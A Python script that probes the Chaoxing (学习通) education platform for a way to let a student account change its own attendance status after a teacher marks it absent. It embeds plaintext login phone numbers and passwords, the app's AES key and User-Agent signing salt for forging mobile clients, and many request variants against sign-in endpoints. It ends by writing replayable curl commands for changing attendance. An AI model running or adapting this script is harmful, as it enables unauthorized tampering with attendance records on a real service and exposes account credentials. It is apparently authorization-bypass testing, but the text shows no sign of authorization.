#!/usr/bin/env python3
"""
综合测试脚本 - 从缺勤状态尝试签到 + 多UA + 多Content-Type + 多域名 + 参数变体
核心思路：先用教师把学生设为缺勤，然后用学生端各种方式尝试签到
"""
import base64, hashlib, json, uuid, requests, urllib3, time, re
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad

urllib3.disable_warnings()

AES_KEY = b"u2oh6Vu^HWe4_AES"
SCHILD_SALT = "ipL$TkeiEmfy1gTXb2XHrdLN0a@7c^vu"
LOGIN_URL = "https://passport2.chaoxing.com/fanyalogin"
COURSE_ID = "257485372"
CLASS_ID = "132821141"
BASE = "https://mobilelearn.chaoxing.com"
PUID_S = "431407443"
PUID_T = "402644510"

results = []

def aes_enc(p):
    c = AES.new(AES_KEY, AES.MODE_CBC, AES_KEY)
    return base64.b64encode(c.encrypt(pad(p.encode(), AES.block_size))).decode()

def schild_sign(model, locale, version, build, imei):
    parts = [f"(schild:{SCHILD_SALT})", f"(device:{model})", f"Language/{locale}",
             f"com.chaoxing.mobile/ChaoXingStudy_3_{version}_android_phone_{build}",
             f"(@Kalimdor)_{imei}"]
    return hashlib.md5(" ".join(parts).encode()).hexdigest()

def get_mobile_ua(model="MI10", version="6.7.2", build="10941_314"):
    imei = uuid.uuid4().hex[:32]
    sc = schild_sign(model, "zh_CN", version, build, imei)
    return (f"Mozilla/5.0 (Linux; Android 16; {model} Build/OPM1.171019.019; wv) "
            f"AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/71.0.3578.99 Mobile Safari/537.36 "
            f"(schild:{sc}) (device:{model}) Language/zh_CN "
            f"com.chaoxing.mobile/ChaoXingStudy_3_{version}_android_phone_{build} "
            f"(@Kalimdor)_{imei}")

def login(phone, pwd, ua=None):
    s = requests.Session()
    s.verify = False
    if ua is None:
        ua = get_mobile_ua()
    s.headers.update({"User-Agent": ua, "Accept": "application/json, text/plain, */*", "Accept-Language": "zh_CN"})
    s.post(LOGIN_URL, data={"fid": "-1", "uname": aes_enc(phone), "password": aes_enc(pwd),
                            "refer": "http%3A%2F%2Fi.mooc.chaoxing.com", "t": "true",
                            "forbidotherlogin": "0", "validate": "", "doubleFactorLogin": "0",
                            "independentId": "0", "independentNameId": "0"},
           allow_redirects=False, timeout=30)
    puid = ""
    for c in s.cookies:
        if c.name in ("UID", "_uid"):
            puid = c.value
    try: s.get("https://i.chaoxing.com/base", timeout=20, allow_redirects=True)
    except: pass
    try: s.get("https://mooc1-api.chaoxing.com/mooc-ans/mycourse/backclazzdata?view=json&m=0", timeout=20)
    except: pass
    return s, puid

def safe_json(r):
    try: return r.json()
    except: return {"_raw_status": r.status_code, "_raw_text": r.text[:500]}

def get_status(d):
    if isinstance(d, dict) and "data" in d and d["data"] is not None and isinstance(d["data"], dict):
        return d["data"].get("status")
    return None

def query_status(session, aid, puid):
    r = session.get(f"{BASE}/v2/apis/sign/signIn", params={"activeId": aid, "uid": puid}, timeout=20)
    return get_status(safe_json(r))

def rec(tag, ua_name, api, before, after, response, extra=""):
    changed = before != after
    marker = "*** CHANGED ***" if changed else ""
    entry = {"tag": tag, "ua": ua_name, "api": api, "before": before, "after": after,
             "changed": changed, "response": response[:200], "extra": extra}
    results.append(entry)
    print(f"  {marker:16s} {ua_name:25s} {api:50s} {str(before):>6s}->{str(after):<6s} {response[:80]}")
    return changed

ajax_hdr = {"Referer": "https://mobilelearn.chaoxing.com/", "X-Requested-With": "XMLHttpRequest",
            "Content-Type": "application/x-www-form-urlencoded"}

# UA列表
uas = {
    "MobileApp_6.7.2": get_mobile_ua("MI10", "6.7.2", "10941_314"),
    "MobileApp_6.5.0": get_mobile_ua("MI10", "6.5.0", "10850_312"),
    "MobileApp_6.3.0": get_mobile_ua("MI10", "6.3.0", "10700_308"),
    "MobileApp_5.5.0": get_mobile_ua("MI10", "5.5.0", "9800_300"),
    "MobileWeb": "Mozilla/5.0 (Linux; Android 16; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36",
    "PC_Chrome": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36",
    "PC_Edge": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 Edg/107.0.1418.42",
    "WeChat": "Mozilla/5.0 (Linux; Android 16; MI10 Build/OPM1.171019.019; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.0.0 Mobile Safari/537.36 MicroMessenger/8.0.30.2400(0x28001E35) NetType/WIFI Language/zh_CN",
    "iPad": "Mozilla/5.0 (iPad; CPU OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/107.0.0.0 Mobile/15E148 Safari/604.1",
    "iPhone_Web": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1",
}

print("=" * 100)
print("综合测试 - 从缺勤状态尝试签到 + 多UA + 多Content-Type + 多域名 + 参数变体")
print("=" * 100)

# 登录教师
s_t, _ = login("19712720708", "3.1415926Cpy")
print(f"教师登录成功")

# 获取活动列表
r = s_t.get(f"{BASE}/ppt/activeAPI/taskactivelist",
            params={"courseId": COURSE_ID, "classId": CLASS_ID, "uid": PUID_T}, timeout=20)
d = safe_json(r)
activities = []
if isinstance(d, dict) and "activeList" in d:
    for item in d["activeList"]:
        if str(item.get("activeType", "")) == "2":  # 签到类型
            activities.append(item)

# 选择3个测试活动
test_aids = [str(a["id"]) for a in activities[:3]]
if not test_aids:
    test_aids = ["5000163891319", "5000163767353", "5000139410338"]

print(f"测试活动: {test_aids}")

# ======================================================================
# 阶段1: 对每个UA，先设缺勤，再尝试各种方式签到
# ======================================================================
print(f"\n{'=' * 100}")
print("阶段1: 多UA x 多API - 从缺勤状态尝试签到")
print(f"{'=' * 100}")

aid = test_aids[0]  # 用第一个活动做主要测试

for ua_name, ua_str in uas.items():
    print(f"\n--- UA: {ua_name} ---")

    # 学生用该UA登录
    s_s, puid_s = login("18436633997", "3.1415926Cpy", ua_str)
    if not puid_s:
        print(f"  登录失败，跳过")
        continue

    # 教师设为缺勤
    s_t.post(f"{BASE}/pptSign/updateSignStatusByUidsV2",
             params={"DB_STRATEGY": "PRIMARY_KEY", "STRATEGY_PARA": "activeId", "activeId": aid},
             data={"uids": PUID_S, "status": "0", "remark": ""},
             headers=ajax_hdr, timeout=20)
    time.sleep(2)

    before = query_status(s_s, aid, PUID_S)
    print(f"  缺勤后状态: {before}")

    # API 1: newsign/updateSignStatus
    r = s_s.post(f"{BASE}/newsign/updateSignStatus",
                 params={"DB_STRATEGY": "PRIMARY_KEY", "STRATEGY_PARA": "activeId", "activeId": aid},
                 data={"uids": PUID_S, "status": "1", "remark": "",
                       "activeId": aid, "classId": CLASS_ID, "courseId": COURSE_ID, "uid": PUID_S},
                 headers=ajax_hdr, timeout=20)
    time.sleep(2)
    after = query_status(s_s, aid, PUID_S)
    rec("phase1", ua_name, "newsign/updateSignStatus", before, after, r.text)

    # 如果已经变了，恢复缺勤继续测试
    if after != before and after is not None:
        s_t.post(f"{BASE}/pptSign/updateSignStatusByUidsV2",
                 params={"DB_STRATEGY": "PRIMARY_KEY", "STRATEGY_PARA": "activeId", "activeId": aid},
                 data={"uids": PUID_S, "status": "0", "remark": ""},
                 headers=ajax_hdr, timeout=20)
        time.sleep(2)
        before = query_status(s_s, aid, PUID_S)

    # API 2: pptSign/updateSignStatus
    r = s_s.post(f"{BASE}/pptSign/updateSignStatus",
                 data={"activeId": aid, "classId": CLASS_ID, "courseId": COURSE_ID,
                       "uid": PUID_S, "studentId": PUID_S, "status": "1"},
                 headers=ajax_hdr, timeout=20)
    time.sleep(2)
    after = query_status(s_s, aid, PUID_S)
    rec("phase1", ua_name, "pptSign/updateSignStatus", before, after, r.text)

    if after != before and after is not None:
        s_t.post(f"{BASE}/pptSign/updateSignStatusByUidsV2",
                 params={"DB_STRATEGY": "PRIMARY_KEY", "STRATEGY_PARA": "activeId", "activeId": aid},
                 data={"uids": PUID_S, "status": "0", "remark": ""},
                 headers=ajax_hdr, timeout=20)
        time.sleep(2)
        before = query_status(s_s, aid, PUID_S)

    # API 3: pptSign/updateSignStatusByUidsV2
    r = s_s.post(f"{BASE}/pptSign/updateSignStatusByUidsV2",
                 params={"DB_STRATEGY": "PRIMARY_KEY", "STRATEGY_PARA": "activeId", "activeId": aid},
                 data={"uids": PUID_S, "status": "1", "remark": ""},
                 headers=ajax_hdr, timeout=20)
    time.sleep(2)
    after = query_status(s_s, aid, PUID_S)
    rec("phase1", ua_name, "pptSign/updateSignStatusByUidsV2", before, after, r.text)

    if after != before and after is not None:
        s_t.post(f"{BASE}/pptSign/updateSignStatusByUidsV2",
                 params={"DB_STRATEGY": "PRIMARY_KEY", "STRATEGY_PARA": "activeId", "activeId": aid},
                 data={"uids": PUID_S, "status": "0", "remark": ""},
                 headers=ajax_hdr, timeout=20)
        time.sleep(2)
        before = query_status(s_s, aid, PUID_S)

    # API 4: stuSignajax (标准)
    r = s_s.post(f"{BASE}/pptSign/stuSignajax",
                 data={"activeId": aid, "uid": PUID_S, "clientip": "",
                       "latitude": "-1", "longitude": "-1", "appType": "15", "fid": "0"},
                 headers=ajax_hdr, timeout=20)
    time.sleep(2)
    after = query_status(s_s, aid, PUID_S)
    rec("phase1", ua_name, "stuSignajax(标准)", before, after, r.text)

    if after != before and after is not None:
        s_t.post(f"{BASE}/pptSign/updateSignStatusByUidsV2",
                 params={"DB_STRATEGY": "PRIMARY_KEY", "STRATEGY_PARA": "activeId", "activeId": aid},
                 data={"uids": PUID_S, "status": "0", "remark": ""},
                 headers=ajax_hdr, timeout=20)
        time.sleep(2)
        before = query_status(s_s, aid, PUID_S)

    # API 5: stuSignajax (带status=1)
    r = s_s.post(f"{BASE}/pptSign/stuSignajax",
                 data={"activeId": aid, "uid": PUID_S, "clientip": "",
                       "latitude": "-1", "longitude": "-1", "appType": "15", "fid": "0",
                       "status": "1"},
                 headers=ajax_hdr, timeout=20)
    time.sleep(2)
    after = query_status(s_s, aid, PUID_S)
    rec("phase1", ua_name, "stuSignajax(status=1)", before, after, r.text)

    if after != before and after is not None:
        s_t.post(f"{BASE}/pptSign/updateSignStatusByUidsV2",
                 params={"DB_STRATEGY": "PRIMARY_KEY", "STRATEGY_PARA": "activeId", "activeId": aid},
                 data={"uids": PUID_S, "status": "0", "remark": ""},
                 headers=ajax_hdr, timeout=20)
        time.sleep(2)
        before = query_status(s_s, aid, PUID_S)

    # API 6: stuSignajax (带位置)
    r = s_s.post(f"{BASE}/pptSign/stuSignajax",
                 data={"activeId": aid, "uid": PUID_S, "clientip": "",
                       "latitude": "34.78", "longitude": "113.66", "appType": "15", "fid": "0",
                       "address": "郑州市"},
                 headers=ajax_hdr, timeout=20)
    time.sleep(2)
    after = query_status(s_s, aid, PUID_S)
    rec("phase1", ua_name, "stuSignajax(位置)", before, after, r.text)

    # 恢复
    s_t.post(f"{BASE}/pptSign/updateSignStatusByUidsV2",
             params={"DB_STRATEGY": "PRIMARY_KEY", "STRATEGY_PARA": "activeId", "activeId": aid},
             data={"uids": PUID_S, "status": "1", "remark": ""},
             headers=ajax_hdr, timeout=20)

# ======================================================================
# 阶段2: 不同Content-Type + 请求格式
# ======================================================================
print(f"\n{'=' * 100}")
print("阶段2: 不同Content-Type + 请求格式 (MobileApp UA)")
print(f"{'=' * 100}")

s_s, _ = login("18436633997", "3.1415926Cpy")

# 设为缺勤
s_t.post(f"{BASE}/pptSign/updateSignStatusByUidsV2",
         params={"DB_STRATEGY": "PRIMARY_KEY", "STRATEGY_PARA": "activeId", "activeId": aid},
         data={"uids": PUID_S, "status": "0", "remark": ""},
         headers=ajax_hdr, timeout=20)
time.sleep(2)
before = query_status(s_s, aid, PUID_S)
print(f"  缺勤后状态: {before}")

# JSON格式
r = s_s.post(f"{BASE}/newsign/updateSignStatus",
             params={"DB_STRATEGY": "PRIMARY_KEY", "STRATEGY_PARA": "activeId", "activeId": aid},
             json={"uids": PUID_S, "status": "1", "remark": "",
                   "activeId": aid, "classId": CLASS_ID, "courseId": COURSE_ID, "uid": PUID_S},
             headers={"Referer": f"{BASE}/", "Content-Type": "application/json"},
             timeout=20)
time.sleep(2)
after = query_status(s_s, aid, PUID_S)
rec("phase2", "MobileApp", "newsign/json格式", before, after, r.text)

if after != before and after is not None:
    s_t.post(f"{BASE}/pptSign/updateSignStatusByUidsV2",
             params={"DB_STRATEGY": "PRIMARY_KEY", "STRATEGY_PARA": "activeId", "activeId": aid},
             data={"uids": PUID_S, "status": "0", "remark": ""},
             headers=ajax_hdr, timeout=20)
    time.sleep(2)
    before = query_status(s_s, aid, PUID_S)

# multipart/form-data
files_data = {"uids": (None, PUID_S), "status": (None, "1"), "remark": (None, ""),
              "activeId": (None, aid), "classId": (None, CLASS_ID), "courseId": (None, COURSE_ID), "uid": (None, PUID_S)}
r = s_s.post(f"{BASE}/newsign/updateSignStatus",
             params={"DB_STRATEGY": "PRIMARY_KEY", "STRATEGY_PARA": "activeId", "activeId": aid},
             files=files_data,
             headers={"Referer": f"{BASE}/"},
             timeout=20)
time.sleep(2)
after = query_status(s_s, aid, PUID_S)
rec("phase2", "MobileApp", "newsign/multipart格式", before, after, r.text)

if after != before and after is not None:
    s_t.post(f"{BASE}/pptSign/updateSignStatusByUidsV2",
             params={"DB_STRATEGY": "PRIMARY_KEY", "STRATEGY_PARA": "activeId", "activeId": aid},
             data={"uids": PUID_S, "status": "0", "remark": ""},
             headers=ajax_hdr, timeout=20)
    time.sleep(2)
    before = query_status(s_s, aid, PUID_S)

# GET方式
r = s_s.get(f"{BASE}/newsign/updateSignStatus",
            params={"DB_STRATEGY": "PRIMARY_KEY", "STRATEGY_PARA": "activeId", "activeId": aid,
                    "uids": PUID_S, "status": "1", "remark": "",
                    "activeId": aid, "classId": CLASS_ID, "courseId": COURSE_ID, "uid": PUID_S},
            timeout=20)
time.sleep(2)
after = query_status(s_s, aid, PUID_S)
rec("phase2", "MobileApp", "newsign/GET方式", before, after, r.text)

if after != before and after is not None:
    s_t.post(f"{BASE}/pptSign/updateSignStatusByUidsV2",
             params={"DB_STRATEGY": "PRIMARY_KEY", "STRATEGY_PARA": "activeId", "activeId": aid},
             data={"uids": PUID_S, "status": "0", "remark": ""},
             headers=ajax_hdr, timeout=20)
    time.sleep(2)
    before = query_status(s_s, aid, PUID_S)

# PUT方法
r = s_s.put(f"{BASE}/newsign/updateSignStatus",
            params={"DB_STRATEGY": "PRIMARY_KEY", "STRATEGY_PARA": "activeId", "activeId": aid},
            data={"uids": PUID_S, "status": "1", "remark": "",
                  "activeId": aid, "classId": CLASS_ID, "courseId": COURSE_ID, "uid": PUID_S},
            headers=ajax_hdr, timeout=20)
time.sleep(2)
after = query_status(s_s, aid, PUID_S)
rec("phase2", "MobileApp", "newsign/PUT方法", before, after, r.text)

# stuSignajax - multipart
files_data2 = {"activeId": (None, aid), "uid": (None, PUID_S), "clientip": (None, ""),
               "latitude": (None, "-1"), "longitude": (None, "-1"), "appType": (None, "15"), "fid": (None, "0")}
r = s_s.post(f"{BASE}/pptSign/stuSignajax", files=files_data2,
             headers={"Referer": f"{BASE}/"}, timeout=20)
time.sleep(2)
after = query_status(s_s, aid, PUID_S)
rec("phase2", "MobileApp", "stuSignajax/multipart", before, after, r.text)

# 恢复
s_t.post(f"{BASE}/pptSign/updateSignStatusByUidsV2",
         params={"DB_STRATEGY": "PRIMARY_KEY", "STRATEGY_PARA": "activeId", "activeId": aid},
         data={"uids": PUID_S, "status": "1", "remark": ""},
         headers=ajax_hdr, timeout=20)

# ======================================================================
# 阶段3: 参数名变体测试
# ======================================================================
print(f"\n{'=' * 100}")
print("阶段3: 参数名变体测试 (MobileApp UA)")
print(f"{'=' * 100}")

s_s, _ = login("18436633997", "3.1415926Cpy")

# 设为缺勤
s_t.post(f"{BASE}/pptSign/updateSignStatusByUidsV2",
         params={"DB_STRATEGY": "PRIMARY_KEY", "STRATEGY_PARA": "activeId", "activeId": aid},
         data={"uids": PUID_S, "status": "0", "remark": ""},
         headers=ajax_hdr, timeout=20)
time.sleep(2)
before = query_status(s_s, aid, PUID_S)
print(f"  缺勤后状态: {before}")

# 参数名变体
param_variants = [
    # newsign/updateSignStatus 不同参数名
    {"uids": PUID_S, "status": "1", "remark": "", "activeId": aid, "classId": CLASS_ID, "courseId": COURSE_ID, "uid": PUID_S, "signStatus": "1"},
    {"uids": PUID_S, "status": "1", "remark": "", "activeId": aid, "classId": CLASS_ID, "courseId": COURSE_ID, "uid": PUID_S, "resultStatus": "1"},
    {"uids": PUID_S, "status": "1", "remark": "", "activeId": aid, "classId": CLASS_ID, "courseId": COURSE_ID, "uid": PUID_S, "operateType": "1"},
    {"uids": PUID_S, "status": "1", "remark": "", "activeId": aid, "classId": CLASS_ID, "courseId": COURSE_ID, "uid": PUID_S, "sourceType": "1"},
    {"uids": PUID_S, "status": "1", "remark": "", "activeId": aid, "classId": CLASS_ID, "courseId": COURSE_ID, "uid": PUID_S, "clientType": "android"},
    {"uids": PUID_S, "status": "1", "remark": "", "activeId": aid, "classId": CLASS_ID, "courseId": COURSE_ID, "uid": PUID_S, "appType": "15"},
    # 不同uid参数
    {"uids": PUID_S, "status": "1", "remark": "", "activeId": aid, "classId": CLASS_ID, "courseId": COURSE_ID, "uid": PUID_T},
    # stuId/userId/studentUid
    {"uids": PUID_S, "status": "1", "remark": "", "activeId": aid, "classId": CLASS_ID, "courseId": COURSE_ID, "uid": PUID_S, "stuId": PUID_S},
    {"uids": PUID_S, "status": "1", "remark": "", "activeId": aid, "classId": CLASS_ID, "courseId": COURSE_ID, "uid": PUID_S, "userId": PUID_S},
    {"uids": PUID_S, "status": "1", "remark": "", "activeId": aid, "classId": CLASS_ID, "courseId": COURSE_ID, "uid": PUID_S, "studentUid": PUID_S},
]

for i, params in enumerate(param_variants):
    r = s_s.post(f"{BASE}/newsign/updateSignStatus",
                 params={"DB_STRATEGY": "PRIMARY_KEY", "STRATEGY_PARA": "activeId", "activeId": aid},
                 data=params, headers=ajax_hdr, timeout=20)
    time.sleep(2)
    after = query_status(s_s, aid, PUID_S)
    changed = rec("phase3", "MobileApp", f"newsign/变体{i+1}", before, after, r.text,
                  str(list(params.keys())))
    if changed:
        s_t.post(f"{BASE}/pptSign/updateSignStatusByUidsV2",
                 params={"DB_STRATEGY": "PRIMARY_KEY", "STRATEGY_PARA": "activeId", "activeId": aid},
                 data={"uids": PUID_S, "status": "0", "remark": ""},
                 headers=ajax_hdr, timeout=20)
        time.sleep(2)
        before = query_status(s_s, aid, PUID_S)

# 恢复
s_t.post(f"{BASE}/pptSign/updateSignStatusByUidsV2",
         params={"DB_STRATEGY": "PRIMARY_KEY", "STRATEGY_PARA": "activeId", "activeId": aid},
         data={"uids": PUID_S, "status": "1", "remark": ""},
         headers=ajax_hdr, timeout=20)

# ======================================================================
# 阶段4: 其他域名 + 不同UA
# ======================================================================
print(f"\n{'=' * 100}")
print("阶段4: 其他域名探索")
print(f"{'=' * 100}")

other_domains = [
    ("https://mooc1-api.chaoxing.com", [
        "/mooc-ans/newsign/updateSignStatus",
        "/mooc-ans/pptSign/stuSignajax",
        "/mooc-ans/pptSign/updateSignStatusByUidsV2",
        "/newsign/updateSignStatus",
        "/pptSign/stuSignajax",
    ]),
    ("https://learn.chaoxing.com", [
        "/newsign/updateSignStatus",
        "/pptSign/stuSignajax",
        "/apis/newsign/updateSignStatus",
        "/apis/pptSign/stuSignajax",
    ]),
    ("https://office.chaoxing.com", [
        "/front/sign/updateSignStatus",
        "/front/newsign/updateSignStatus",
        "/front/pptSign/stuSignajax",
    ]),
]

for ua_name, ua_str in [("MobileApp_6.7.2", uas["MobileApp_6.7.2"]), ("PC_Chrome", uas["PC_Chrome"])]:
    s_s, _ = login("18436633997", "3.1415926Cpy", ua_str)
    for domain, paths in other_domains:
        for path in paths:
            try:
                if "updateSignStatus" in path and "stuSignajax" not in path:
                    r = s_s.post(f"{domain}{path}",
                                 params={"DB_STRATEGY": "PRIMARY_KEY", "STRATEGY_PARA": "activeId", "activeId": aid},
                                 data={"uids": PUID_S, "status": "1", "remark": "",
                                       "activeId": aid, "classId": CLASS_ID, "courseId": COURSE_ID, "uid": PUID_S},
                                 headers=ajax_hdr, timeout=15)
                else:
                    r = s_s.post(f"{domain}{path}",
                                 data={"activeId": aid, "uid": PUID_S, "clientip": "",
                                       "latitude": "-1", "longitude": "-1", "appType": "15", "fid": "0"},
                                 headers=ajax_hdr, timeout=15)
                resp = f"HTTP {r.status_code}, {r.text[:80]}"
            except Exception as e:
                resp = f"ERROR: {e}"
            print(f"  {ua_name:25s} {domain}{path}: {resp}")

# ======================================================================
# 阶段5: 完整签到流程模拟 - preSign + stuSignajax
# ======================================================================
print(f"\n{'=' * 100}")
print("阶段5: 完整签到流程模拟")
print(f"{'=' * 100}")

for ua_name in ["MobileApp_6.7.2", "PC_Chrome"]:
    ua_str = uas[ua_name]
    s_s, _ = login("18436633997", "3.1415926Cpy", ua_str)

    # 设为缺勤
    s_t.post(f"{BASE}/pptSign/updateSignStatusByUidsV2",
             params={"DB_STRATEGY": "PRIMARY_KEY", "STRATEGY_PARA": "activeId", "activeId": aid},
             data={"uids": PUID_S, "status": "0", "remark": ""},
             headers=ajax_hdr, timeout=20)
    time.sleep(2)

    print(f"\n  --- {ua_name} ---")

    # Step 1: preSign
    r = s_s.get(f"{BASE}/pptSign/preSign",
                params={"activeId": aid, "courseId": COURSE_ID, "classId": CLASS_ID},
                timeout=20)
    print(f"  preSign: HTTP {r.status_code}, len={len(r.text)}, {r.text[:100]}")

    # Step 2: 获取活动详情（可能包含enc等信息）
    r = s_s.get(f"{BASE}/ppt/activeAPI/taskactivelist",
                params={"courseId": COURSE_ID, "classId": CLASS_ID, "uid": PUID_S},
                timeout=20)
    d = safe_json(r)
    if isinstance(d, dict) and "activeList" in d:
        for item in d["activeList"]:
            if str(item.get("id", "")) == aid:
                print(f"  活动详情: {json.dumps(item, ensure_ascii=False)[:200]}")
                # 检查是否有enc字段
                if "enc" in item:
                    print(f"  *** 发现enc字段: {item['enc']} ***")
                break

    # Step 3: stuSignajax (各种参数组合)
    sign_attempts = [
        {"activeId": aid, "uid": PUID_S, "clientip": "", "latitude": "-1", "longitude": "-1", "appType": "15", "fid": "0"},
        {"activeId": aid, "uid": PUID_S, "clientip": "", "latitude": "-1", "longitude": "-1", "appType": "15", "fid": "0", "status": "1"},
        {"activeId": aid, "uid": PUID_S, "clientip": "", "latitude": "-1", "longitude": "-1", "appType": "15", "fid": "0", "enc": ""},
        {"activeId": aid, "uid": PUID_S, "clientip": "", "latitude": "-1", "longitude": "-1", "appType": "15", "fid": "0", "enc": "0"},
        {"activeId": aid, "uid": PUID_S, "clientip": "", "latitude": "-1", "longitude": "-1", "appType": "15", "fid": "0", "isfrom": "1"},
    ]

    for i, data in enumerate(sign_attempts):
        before = query_status(s_s, aid, PUID_S)
        r = s_s.post(f"{BASE}/pptSign/stuSignajax", data=data, headers=ajax_hdr, timeout=20)
        time.sleep(2)
        after = query_status(s_s, aid, PUID_S)
        changed = rec("phase5", ua_name, f"stuSignajax/尝试{i+1}", before, after, r.text)
        if changed:
            print(f"  *** 签到成功！参数: {data} ***")
            # 恢复缺勤继续测试
            s_t.post(f"{BASE}/pptSign/updateSignStatusByUidsV2",
                     params={"DB_STRATEGY": "PRIMARY_KEY", "STRATEGY_PARA": "activeId", "activeId": aid},
                     data={"uids": PUID_S, "status": "0", "remark": ""},
                     headers=ajax_hdr, timeout=20)
            time.sleep(2)

    # 恢复
    s_t.post(f"{BASE}/pptSign/updateSignStatusByUidsV2",
             params={"DB_STRATEGY": "PRIMARY_KEY", "STRATEGY_PARA": "activeId", "activeId": aid},
             data={"uids": PUID_S, "status": "1", "remark": ""},
             headers=ajax_hdr, timeout=20)

# ======================================================================
# 汇总
# ======================================================================
print(f"\n{'=' * 100}")
print("测试结果汇总")
print(f"{'=' * 100}")

changed_results = [r for r in results if r["changed"]]
unchanged_results = [r for r in results if not r["changed"]]

print(f"\n状态改变的测试 ({len(changed_results)}):")
for r in changed_results:
    print(f"  *** {r['ua']} | {r['api']} | {r['before']}->{r['after']} | {r['response'][:80]}")

print(f"\n状态未变的测试 ({len(unchanged_results)}):")
for r in unchanged_results:
    print(f"  {r['ua']:25s} {r['api']:50s} {str(r['before']):>6s}->{str(r['after']):<6s}")

# 保存结果
with open("/workspace/comprehensive_ua_results.json", "w", encoding="utf-8") as f:
    json.dump(results, f, ensure_ascii=False, indent=2)

# 生成curl命令
with open("/workspace/verify_curl_commands_v2.txt", "w", encoding="utf-8") as f:
    f.write("# 学习通签到状态修改 - curl验证命令\n\n")
    f.write("## 替换说明:\n")
    f.write(f"# ACTIVE_ID = {aid}\n")
    f.write(f"# STUDENT_UID = {PUID_S}\n")
    f.write(f"# COURSE_ID = {COURSE_ID}\n")
    f.write(f"# CLASS_ID = {CLASS_ID}\n\n")

    f.write("## 1. newsign/updateSignStatus (POST)\n")
    f.write(f"""curl -X POST '{BASE}/newsign/updateSignStatus?DB_STRATEGY=PRIMARY_KEY&STRATEGY_PARA=activeId&activeId={aid}' \\
  -H 'Content-Type: application/x-www-form-urlencoded' \\
  -H 'Referer: {BASE}/' \\
  -H 'X-Requested-With: XMLHttpRequest' \\
  -b '你的Cookie' \\
  -d 'uids={PUID_S}&status=1&remark=&activeId={aid}&classId={CLASS_ID}&courseId={COURSE_ID}&uid={PUID_S}'\n\n""")

    f.write("## 2. pptSign/stuSignajax (POST)\n")
    f.write(f"""curl -X POST '{BASE}/pptSign/stuSignajax' \\
  -H 'Content-Type: application/x-www-form-urlencoded' \\
  -H 'Referer: {BASE}/' \\
  -H 'X-Requested-With: XMLHttpRequest' \\
  -b '你的Cookie' \\
  -d 'activeId={aid}&uid={PUID_S}&clientip=&latitude=-1&longitude=-1&appType=15&fid=0'\n\n""")

    f.write("## 3. 查询签到状态\n")
    f.write(f"""curl '{BASE}/v2/apis/sign/signIn?activeId={aid}&uid={PUID_S}' \\
  -b '你的Cookie'\n""")

print(f"\n结果已保存到 /workspace/comprehensive_ua_results.json")
print(f"curl命令已保存到 /workspace/verify_curl_commands_v2.txt")
